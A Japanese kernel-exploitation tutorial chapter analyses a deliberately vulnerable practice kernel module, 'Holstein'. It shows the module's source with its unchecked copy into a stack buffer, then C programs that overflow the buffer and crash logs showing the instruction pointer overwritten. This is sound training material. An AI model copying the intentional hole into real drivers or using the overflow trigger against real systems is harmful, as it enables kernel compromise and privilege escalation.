---
title: Holsteinモジュールの解析と脆弱性の発火
tags:
    - [Linux]
    - [Kernel]
    - [Stack Overflow]
lang: ja
---
LK01(Holstein)の章ではKernel Exploitの基礎的な攻撃手法について学びます。導入の章でLK01をダウンロードしていない方は、まず[練習問題LK01](#)のファイルをダウンロードしてください。

`qemu/rootfs.cpio`がファイルシステムになります。ここでは`mount`ディレクトリを作って、そこにcpioを展開しておきます。（root権限で作成してください。）

## 初期化処理の確認
まず`/init`というファイルがありますが、これはカーネルロード後、最初にユーザー空間で実行される処理になります。CTFなどではここにカーネルモジュールのロード等の処理が書かれている場合もあるので、必ずチェックしましょう。
今回は`/init`はbuildroot標準のもので、モジュールのロード等の処理は`/etc/init.d/S99pawnyable`に記載しています。
```sh
#!/bin/sh

##
## Setup
##
mdev -s
mount -t proc none /proc
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
stty -opost
echo 2 > /proc/sys/kernel/kptr_restrict
#echo 1 > /proc/sys/kernel/dmesg_restrict

##
## Install driver
##
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0

##
## User shell
##
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
echo "[ Holstein v1 (KL01) - Pawnyable ]"
setsid cttyhack setuidgid 1337 sh

##
## Cleanup
##
umount /proc
poweroff -d 0 -f
```
ここで重要になる行がいくつかあります。まず
```sh
echo 2 > /proc/sys/kernel/kptr_restrict
```
ですが、これは既に学んだ通りKADRを制御するコマンドで、KADRが有効になっていることが分かります。これはデバッグでは邪魔なので無効化しておきましょう。
次にコメントアウトされている
```sh
#echo 1 > /proc/sys/kernel/dmesg_restrict
```
ですが、これはCTFの問題では多くの場合有効になっています。意味は一般ユーザーにdmesgを許可するかです。今回は練習なのでdmesgは許可しています。

次に
```sh
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
```
でカーネルモジュールをロードしています。
`insmod`コマンドで`/root/vuln.ko`というモジュールをロードし、その後`mknod`で`/dev/holstein`というキャラクタデバイスファイルに`holstein`という名前のモジュールを紐づけています。

最後に
```sh
setsid cttyhack setuidgid 1337 sh
```
ですが、これはユーザーIDを1337にして`sh`を実行しています。ログインプロンプトなしでシェルが起動するのは、このコマンドのおかげです。

デバッグの際は、このユーザーIDを0にしておけばrootのシェルが取れるので、まだ例題を済ませていない方は変更しておいてください。

## Holsteinモジュールの解析
この章ではHolsteinと名付けられた脆弱なカーネルモジュールを題材にKernel Exploitを学びます。`src/vuln.c`にカーネルモジュールのソースコードがあるので、まずはこれを読んでいきましょう。

### 初期化と終了
カーネルモジュールを書く際は、必ず初期化と終了処理を書きます。
108行目で
```c
module_init(module_initialize);
module_exit(module_cleanup);
```
と記述されていますが、ここでそれぞれ初期化、終了処理の関数を指定しています。まずは初期化の`module_initialize`を読んでみましょう。
```c
static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}
```
ユーザー空間からカーネルモジュールを操作できるようにするためには、インタフェースを作成する必要があります。インタフェースは`/dev`や`/proc`に作られることが多く、今回は`cdev_add`を使っているのでキャラクタデバイス`/dev`を介して操作するタイプのモジュールになります。といってもこの時点で`/dev`以下にファイルが作られる訳ではありません。先程`S99pawnyable`で見たように、`/dev/holstein`は`mknod`コマンドで作られていました。

さて、`cdev_init`という関数の第二引数に`module_fops`という変数のポインタを渡しています。この変数は関数テーブルで、`/dev/holstein`に対して`open`や`write`等の操作があった際に、対応する関数が呼び出されるようになっています。
```c
static struct file_operations module_fops =
  {
   .owner   = THIS_MODULE,
   .read    = module_read,
   .write   = module_write,
   .open    = module_open,
   .release = module_close,
  };
```
このモジュールでは`open`, `read`, `write`, `close`の4つに対する処理のみを定義しており、その他は未実装（呼んでも何も起きない）となっています。

最後に、モジュールの解放処理は単にキャラクタデバイスを削除しているだけです。
```c
static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}
```

### open
`module_open`を見てみましょう。
```c
static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```
`printk`という見慣れない関数がありますが、これは文字列をカーネルのログバッファに出力します。`KERN_INFO`というのはログレベルで、他にも`KERN_WARN`等があります。出力は`dmesg`コマンドで確認できます。

次に`kmalloc`という関数を呼んでいます。
これはカーネル空間における`malloc`で、ヒープから指定したサイズの領域を確保できます。今回は`char*`型のグローバル変数`g_buf`に`BUFFER_SIZE`(=0x400)バイトの領域を確保しています。

このモジュールを`open`すると0x400バイトの領域を`g_buf`に確保することが分かりました。

### close
次に`module_close`を見ます。
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```
`kfree`は`kmalloc`と対応し、`kmalloc`で確保したヒープ領域を解放します。
一度ユーザーに`open`されたモジュールは最終的には必ず`close`されるので、最初に確保した`g_buf`を解放するというのは自然な処理です。（ユーザー空間のプログラムが明示的に`close`を呼ばなくても、そのプログラムが終了する際にカーネルが自動的に`close`を呼び出します。）

実はこの段階で既にLPEに繋がる脆弱性があるのですが、それは後の章で扱います。

### read
`module_read`はユーザーが`read`システムコール等を呼び出した際に呼ばれる処理です。
```c
static ssize_t module_read(struct file *file,
                        char __user *buf, size_t count,
                        loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_read called\n");

  memcpy(kbuf, g_buf, BUFFER_SIZE);
  if (_copy_to_user(buf, kbuf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
`g_buf`から`BUFFER_SIZE`だけ`kbuf`というスタックの変数に`memcpy`でコピーしています。
次に、`_copy_to_user`という関数を呼んでいます。SMAPの節で既に説明しましたが、これはユーザー空間に安全にデータをコピーする関数です。`copy_to_user`ではなく`_copy_to_user`になっていますが、これはスタックオーバーフローを検知しないバージョンの`copy_to_user`になります。通常は使われませんが、今回は脆弱性を入れるために使っています。

<div class="balloon">
  <div class="balloon-image-left">
    牛さん
  </div>
  <div class="balloon-text-right">
    <code>copy_to_user</code>や<code>copy_from_user</code>はインライン関数で、可能な場合サイズチェックをするようになっているよ。
  </div>
</div>

ということで、`read`関数は`g_buf`から一度スタックにデータをコピーし、そのデータを要求したサイズだけ読み込む処理になります。

### write
最後に`module_write`を読みましょう。
```c
static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}
```
まず`_copy_from_user`でユーザー空間からデータを`kbuf`というスタック変数にコピーしています。（これもスタックオーバーフローを検知しないバージョンの`copy_from_user`です。）最後に`memcpy`で`g_buf`に最大`BUFFER_SIZE`だけ`kbuf`からデータをコピーしています。

## スタックオーバーフロー脆弱性
さて、カーネルモジュールを一通り読み終えましたが、いくつの脆弱性を見つけられたでしょうか。
Kernel Exploitに挑戦するような方なら少なくとも1つは脆弱性を見つけたかと思います。この節では次の箇所にあるスタックオーバーフローの脆弱性を扱います。
```c
static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}
```
9行目でコピーするサイズ`count`はユーザーから渡ってくるのに対し、`kbuf`は0x400バイトなので自明なスタックバッファオーバーフローがあります。カーネル空間でも関数呼び出しの仕組みはユーザー空間と同じなので、リターンアドレスを書き換えたりROP chainを実行したりできます。

## 脆弱性の発火
脆弱性を悪用する前に、このカーネルモジュールを普通に使うプログラムを書いて、動作することを確認しましょう。今回は次のようなプログラムを書いてみました。
```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf[0x100] = {};
  write(fd, "Hello, World!", 13);
  read(fd, buf, 0x100);

  printf("Data: %s\n", buf);

  close(fd);
  return 0;
}
```
`write`で"Hello, World!"と書き込んで、それを`read`で読むだけのプログラムです。
これをカーネル上で実行してみましょう。
```
/ # ./pwn
Data: Hello, World!
/ # dmesg | tail
input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
tsc: Refined TSC clocksource calibration: 2207.983 MHz
clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x1fd3a847c71, max_idle_ns: 440795301953 ns
clocksource: Switched to clocksource tsc
vuln: loading out-of-tree module taints kernel.
module_open called
module_write called
module_read called
module_close called
random: fast init done
```
期待通りに動いていることが分かります。また、カーネルモジュールが出したログを確認しても特にエラーは発生していません。

次にスタックオーバーフローを発生させてみます。こんな感じで良いでしょう。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf[0x800];
  memset(buf, 'A', 0x800);
  write(fd, buf, 0x800);

  close(fd);
  return 0;
}
```
実行します。
```
/ # ./pwn 
BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____))
kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP PTI
CPU: 0 PID: 62 Comm: pwn Tainted: G           O      5.10.7 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:memset_orig+0x33/0xb0
Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 <48> 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47
RSP: 0018:ffffc90000413a58 EFLAGS: 00000207
RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009
RDX: 00000000000002a8 RSI: 0000000000000000 RDI: ffffc90000414000
RBP: ffffc90000413a78 R08: 4141414141414141 R09: 0000000000000000
R10: ffffc90000414000 R11: 4141414141414141 R12: ffffc90000413aa8
R13: 00000000000002a8 R14: 00007ffe47aac5d0 R15: ffffc90000413ef8
FS:  00000000004051d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffc90000414000 CR3: 000000000317a000 CR4: 00000000000006f0
Call Trace:
 ? _copy_from_user+0x70/0x80
 module_write+0x75/0xef [vuln]
Modules linked in: vuln(O)
---[ end trace 5d32e23a000a5292 ]---
RIP: 0010:memset_orig+0x33/0xb0
Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 <48> 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47
RSP: 0018:ffffc90000413a58 EFLAGS: 00000207
RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009
RDX: 00000000000002a8 RSI: 0000000000000000 RDI: ffffc90000414000
RBP: ffffc90000413a78 R08: 4141414141414141 R09: 0000000000000000
R10: ffffc90000414000 R11: 4141414141414141 R12: ffffc90000413aa8
R13: 00000000000002a8 R14: 00007ffe47aac5d0 R15: ffffc90000413ef8
FS:  00000000004051d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffc90000414000 CR3: 000000000317a000 CR4: 00000000000006f0
Kernel panic - not syncing: Fatal exception
Kernel Offset: disabled
```
何やら禍々しいメッセージが出力されました。
このようにカーネルモジュールが異常な処理を起こすと通常カーネルごと落ちてしまいます。その際クラッシュした原因と、クラッシュ時のレジスタの様子やスタックトレースが出力されます。この情報はKernel Exploitのデバッグで非常に重要です。

今回クラッシュの原因は
```
BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____))
kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP PTI
```
となっています。`ptrval`というのはポインタですが、KADRにより隠されています。
レジスタの様子で気になるのはRIPですが、残念ながら0x414141414141414141にはなっていません。
```
RIP: 0010:memset_orig+0x33/0xb0
```
クラッシュの原因にも書かれているように、`copy_from_user`での書き込みの際にスタックの終端（guard page）に到達してしまったようです。書き込みすぎが原因なので、書き込む量を減らしてみましょう。
```c
write(fd, buf, 0x420);
```
するとクラッシュメッセージが変わります。
```
/ # ./pwn 
general protection fault: 0000 [#1] PREEMPT SMP PTI
CPU: 0 PID: 62 Comm: pwn Tainted: G           O      5.10.7 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:0x4141414141414141
Code: Unable to access opcode bytes at RIP 0x4141414141414117.
RSP: 0018:ffffc90000413eb8 EFLAGS: 00000202
RAX: 0000000000000420 RBX: ffff888003149700 RCX: 0000000000000000
RDX: 000000000000007f RSI: ffffc90000413ea8 RDI: ffff88800315fc00
RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141
R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420
R13: 0000000000000000 R14: 00007ffc38eb1360 R15: ffffc90000413ef8
FS:  00000000004051d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000403000 CR3: 000000000316c000 CR4: 00000000000006f0
Call Trace:
 ? ksys_write+0x53/0xd0
 ? __x64_sys_write+0x15/0x20
 ? do_syscall_64+0x38/0x50
 ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
Modules linked in: vuln(O)
---[ end trace cb6ce0e7fb8d7c81 ]---
RIP: 0010:0x4141414141414141
Code: Unable to access opcode bytes at RIP 0x4141414141414117.
RSP: 0018:ffffc90000413eb8 EFLAGS: 00000202
RAX: 0000000000000420 RBX: ffff888003149700 RCX: 0000000000000000
RDX: 000000000000007f RSI: ffffc90000413ea8 RDI: ffff88800315fc00
RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141
R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420
R13: 0000000000000000 R14: 00007ffc38eb1360 R15: ffffc90000413ef8
FS:  00000000004051d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000403000 CR3: 000000000316c000 CR4: 00000000000006f0
Kernel panic - not syncing: Fatal exception
Kernel Offset: disabled
```
今度はgeneral protection faultになり、RIPが取れています！
```
RIP: 0010:0x4141414141414141
```
このように、カーネル空間でもユーザー空間と同様にスタックオーバーフローでRIPを取れます。次の節ではここから権限昇格する方法について学びます。
